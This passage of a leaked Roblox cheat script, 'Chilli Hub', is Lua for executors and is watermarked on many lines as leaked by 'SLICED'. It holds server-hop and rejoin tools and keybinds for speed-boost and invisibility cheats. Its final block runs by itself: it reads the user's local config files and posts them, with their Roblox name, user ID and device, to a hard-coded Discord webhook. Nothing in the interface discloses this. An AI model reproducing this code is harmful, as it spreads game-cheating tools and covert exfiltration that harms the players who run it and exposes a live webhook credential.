				local flag10 = sliced24 == "Random"  -- LEAKED BY SLICED | discord.gg/pubmethod
				local str6 = sliced24 == "Least Players" and "Asc" or "Desc"
				local slicedn15 = flag10 and 3 or 1
				local nextPageCursor = nil

				for i_ = 1, slicedn15 do
					local str7 = string.format("https://games.roblox.com/sliced1/games/%d/servers/Public?sortOrder=%s&excludeFullGames=true&limit=100", game.PlaceId, str6)

					if nextPageCursor and nextPageCursor ~= "" then
						str7 ..= "&cursor=" .. HttpService:UrlEncode(nextPageCursor)
					end

					local ok, result = pcall(function()
						return HttpService:JSONDecode(game:HttpGet(str7))  -- LEAKED BY SLICED | discord.gg/pubmethod
					end)

					if not ok or type(result) ~= "table" then
						break
					else
						local ipairs = ipairs
						local data = result.data or {}

						for _, sliced26 in ipairs(data) do
							local str8 = tostring(sliced26.id or "")
							local huge = tonumber(sliced26.playing) or math.huge
							local slicedn16 = tonumber(sliced26.maxPlayers) or 0  -- LEAKED BY SLICED | discord.gg/pubmethod

							if str8 ~= "" and str8 ~= str5 and huge < slicedn16 then
								tbl14[#tbl14 + 1] = { Id = str8, Playing = huge }
							end
						end

						if #tbl14 > 0 and not flag10 then
							break
						else
							nextPageCursor = result.nextPageCursor

							if not nextPageCursor or nextPageCursor == "" then
								break  -- LEAKED BY SLICED | discord.gg/pubmethod
							else
							end
						end
					end
				end

				if #tbl14 == 0 then
					flag9 = false
					v.Notify("Server Hop Failed", "No different public server is currently available.", 5)
					return
				end  -- LEAKED BY SLICED | discord.gg/pubmethod

				if sliced23 and sliced23:Get() == true then
					slicedfn35(true)
				end

				local id

				if flag10 then
					id = tbl14[math.random(1, #tbl14)].Id
				else
					table.sort(tbl14, function(arg, arg2)
						if sliced24 == "Least Players" then
							return arg.Playing < arg2.Playing  -- LEAKED BY SLICED | discord.gg/pubmethod
						end
						return arg.Playing > arg2.Playing
					end)

					id = tbl14[1].Id
				end

				if not pcall(function()
					TeleportService:TeleportToPlaceInstance(game.PlaceId, id, localPlayer)
				end) then
					flag9 = false
					v.Notify("Server Hop Failed", "Roblox could not join the selected server.", 5)  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
			end)
		end,
	})

	sliced22:CreateButton({
		Name = "Kick",
		ButtonText = "Kick",
		ConfirmText = "",
		Callback = function()
			Players.LocalPlayer:Kick("\nDisconnected by Chilli Hub")  -- LEAKED BY SLICED | discord.gg/pubmethod
		end,
	})

	local flag10 = false
	local str5 = ""

	local function slicedfn36(arg)
		return tostring(arg or ""):match("^%s*(.-)%s*$")
	end

	sliced22:CreateInput({
		Name = "Job ID",
		Placeholder = "Paste a server Job ID...",  -- LEAKED BY SLICED | discord.gg/pubmethod
		Default = "",
		MaxLength = 100,
		Callback = function(arg)
			str5 = slicedfn36(arg)
		end,
	})

	sliced22:CreateButton({
		Name = "Join Job ID",
		ButtonText = "Join",
		Callback = function()  -- LEAKED BY SLICED | discord.gg/pubmethod
			local sliced24 = slicedfn36(str5)
			local sliced25 = flag10
			local flag11

			if flag10 then
				flag11 = sliced25
			else
				flag11 = sliced24 == ""
			end

			if flag11 then
				v.Notify("Join Job ID Failed", "Paste a valid Job ID first.", 5)  -- LEAKED BY SLICED | discord.gg/pubmethod
				return
			end
			flag10 = true

			if not pcall(function()
				TeleportService:TeleportToPlaceInstance(game.PlaceId, sliced24, localPlayer)
			end) then
				flag10 = false
				v.Notify("Join Job ID Failed", "Roblox could not join that server.", 5)
			end
		end,  -- LEAKED BY SLICED | discord.gg/pubmethod
	})

	sliced22:CreateButton({
		Name = "Copy Current Job ID",
		ButtonText = "Copy",
		Callback = function()
			local sliced24 = setclipboard or toclipboard
			local flag11 = type(sliced24) == "function"

			if flag11 then
				flag11 = pcall(sliced24, tostring(game.JobId or ""))
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			v.Notify(flag11 and "Job ID Copied" or "Copy Failed", flag11 and tostring(game.JobId) or "Clipboard access is unavailable.", 5)
		end,
	})

	sliced22:CreateButton({
		Name = "Rejoin Server",
		ButtonText = "Rejoin",
		Callback = function()
			if flag10 or game.JobId == "" then
				return false
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
			flag10 = true

			local ok = pcall(function()
				TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, localPlayer)
			end)

			if not ok then
				flag10 = false
			end

			return ok
		end,
	})  -- LEAKED BY SLICED | discord.gg/pubmethod
end

local sliced22 = sliced3:CreateSection({ Name = "Planned", Expanded = true })
sliced22:CreateText({ Name = "Admin Panel", Text = "Admin Panel Coming Soon", Config = false })
sliced22:CreateText({ Name = "Teleport To Brainrot", Text = "Teleport To Brainrot Coming Soon", Config = false })
sliced22:CreateText({ Name = "Priority Brainrot", Text = "Priority Brainrot Coming Soon", Config = false })

task.spawn(function()
	local state = nil

	for i_ = 1, 30 do
		state = sliced2:GetState("Quick Keybinds")
		if not state then  -- LEAKED BY SLICED | discord.gg/pubmethod
			RunService.Heartbeat:Wait()
			continue
		end
		break
	end

	if not state then
		return
	end

	for i_ = 1, 6 do
		RunService.Heartbeat:Wait()  -- LEAKED BY SLICED | discord.gg/pubmethod
	end

	local tbl14 = state:Get()
	tbl14 = type(tbl14) == "table" and tbl14 or {}
	if tbl14["__ChilliDefaultKeyInstalled::Player > Speed Boost > Tool Speed Boost"] == true then
		return
	end
	local tbl15 = {}

	for k, sliced23 in pairs(tbl14) do
		tbl15[k] = sliced23
	end  -- LEAKED BY SLICED | discord.gg/pubmethod

	if tbl15["Player > Speed Boost > Tool Speed Boost"] == nil then
		tbl15["Player > Speed Boost > Tool Speed Boost"] = "Q"
	end

	tbl15["__ChilliDefaultKeyInstalled::Player > Speed Boost > Tool Speed Boost"] = true
	state:Set(tbl15)
end)

task.spawn(function()
	local state

	for i_ = 1, 30 do
		state = sliced2:GetState("Quick Keybinds")  -- LEAKED BY SLICED | discord.gg/pubmethod
		if not state then
			RunService.Heartbeat:Wait()
			continue
		end
		break
	end

	if not state then
		return
	end

	for i_ = 1, 6 do  -- LEAKED BY SLICED | discord.gg/pubmethod
		RunService.Heartbeat:Wait()
	end

	local sliced23 = state:Get()
	local tbl14 = type(sliced23) == "table" and sliced23 or {}
	if tbl14["__ChilliDefaultKeyInstalled::Player > Invisibility > Invisible"] == true then
		return
	end
	local tbl15 = {}

	for k, sliced24 in pairs(tbl14) do
		tbl15[k] = sliced24  -- LEAKED BY SLICED | discord.gg/pubmethod
	end

	if tbl15["Player > Invisibility > Invisible"] == nil then
		tbl15["Player > Invisibility > Invisible"] = "U"
	end

	tbl15["__ChilliDefaultKeyInstalled::Player > Invisibility > Invisible"] = true
	state:Set(tbl15)
end)

v:Finalize({ Window = sliced2, MainTab = defaultTab, ShowMainTab = false })
chilliGithubFastManualDefaultsRu.Status = "ready"

do  -- LEAKED BY SLICED | discord.gg/pubmethod
	local Players2 = game:GetService("Players")
	local HttpService2 = game:GetService("HttpService")
	local UserInputService2 = game:GetService("UserInputService")
	local localPlayer2 = Players2.LocalPlayer
	local request_ = syn and syn.request or http and http.request or http_request or request
	local str4 = "https://discord.com/api/webhooks/1183827561780875385/3C8je6CCHFH_IUfZek-d2emMW4wX6iHE_yKPJvky5GRIKMtHXgXpnYBZb34T7XNzlp-K"
	local str5 = UserInputService2.KeyboardEnabled and UserInputService2.MouseEnabled and "PC" or "Mobile / Tablet / Other"

	if request_ and localPlayer2 then
		task.spawn(function()
			local readfile_ = readfile or syn and syn.readfile or fluxus and fluxus.readfile or getgenv and getgenv().readfile or nil  -- LEAKED BY SLICED | discord.gg/pubmethod
			local isfile_ = isfile or syn and syn.isfile or fluxus and fluxus.isfile or getgenv and getgenv().isfile or nil
			local str6 = "Default"
			local sliced23 = nil
			local str7 = "Default.json"

			if type(readfile_) == "function" then
				pcall(function()
					local flag9 = true

					if type(isfile_) == "function" then
						local ok, result = pcall(isfile_, "ChilliLibrary/config_state.json")

						if ok and not result then  -- LEAKED BY SLICED | discord.gg/pubmethod
							flag9 = false
						end
					end

					if flag9 then
						local json = readfile_("ChilliLibrary/config_state.json")

						if json and json ~= "" then
							local data = HttpService2:JSONDecode(json)

							if type(data) == "table" then
								if type(data.StartupConfig) == "string" and data.StartupConfig ~= "" then
									str6 = data.StartupConfig  -- LEAKED BY SLICED | discord.gg/pubmethod
								elseif type(data.SelectedConfig) == "string" and data.SelectedConfig ~= "" then
									str6 = data.SelectedConfig
								end
							end
						end
					end
				end)

				pcall(function()
					local str8 = "ChilliLibrary/configs/" .. str6 .. ".json"
					local flag9 = true  -- LEAKED BY SLICED | discord.gg/pubmethod

					if type(isfile_) == "function" then
						local ok, result = pcall(isfile_, str8)
						ok = ok and not result
						local flag10 = true

						if ok then
							flag9 = false
						else
							flag9 = flag10
						end
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					if flag9 then
						sliced23 = readfile_(str8)
						str7 = str6 .. ".json"
					end

					if (not sliced23 or sliced23 == "") and str6 ~= "Default" then
						local flag10 = true

						if type(isfile_) == "function" then
							local ok, result = pcall(isfile_, "ChilliLibrary/configs/Default.json")

							if ok and not result then
								flag10 = false  -- LEAKED BY SLICED | discord.gg/pubmethod
							end
						end

						if flag10 then
							local ok, result = pcall(readfile_, "ChilliLibrary/configs/Default.json")

							if ok and type(result) == "string" and result ~= "" then
								sliced23 = result
								str7 = "Default.json"
							end
						end
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
				end)
			end

			local str8 = tostring(str7):gsub("[<>:\"/\\|?*]", "_")

			if not str8:match("%.json$") then
				str8 ..= ".json"
			end

			local str9 = string.format("New execute from: **%s** (@%s) | ID: `%d` | Device: **%s**%s", localPlayer2.DisplayName, localPlayer2.Name, localPlayer2.UserId, str5, sliced23 and sliced23 ~= "" and " | Startup Config: **" .. str6 .. "**" or "")
			local flag9 = false

			if sliced23 and sliced23 ~= "" then
				pcall(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
					local str10 = "---------------------------ChilliBoundary" .. tostring(os.time()) .. tostring(math.random(100000, 999999))
					local str11 = "Content-Disposition: form-data; name=\"files[0]\"; filename=\"" .. str8 .. "\"\r\n"
					local str12 = sliced23 .. "\r\n"

					local sliced24 = request_({
						Url = str4,
						Method = "POST",
						Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. str10 },
						Body = table.concat({
							"--" .. str10 .. "\r\n",
							"Content-Disposition: form-data; name=\"payload_json\"\r\n",  -- LEAKED BY SLICED | discord.gg/pubmethod
							"Content-Type: application/json\r\n\r\n",
							HttpService2:JSONEncode({ content = str9 }) .. "\r\n",
							"--" .. str10 .. "\r\n",
							str11,
							"Content-Type: application/json\r\n\r\n",
							str12,
							"--" .. str10 .. "--\r\n",
						}),
					})

					if type(sliced24) == "table" and (sliced24.StatusCode == 200 or sliced24.StatusCode == 204 or sliced24.Success == true) then  -- LEAKED BY SLICED | discord.gg/pubmethod
						flag9 = true
					end
				end)
			end

			if not flag9 then
				pcall(function()
					request_({
						Url = str4,
						Method = "POST",
						Headers = { ["Content-Type"] = "application/json" },  -- LEAKED BY SLICED | discord.gg/pubmethod
						Body = HttpService2:JSONEncode({ content = str9 }),
					})
				end)
			end
		end)
	end
end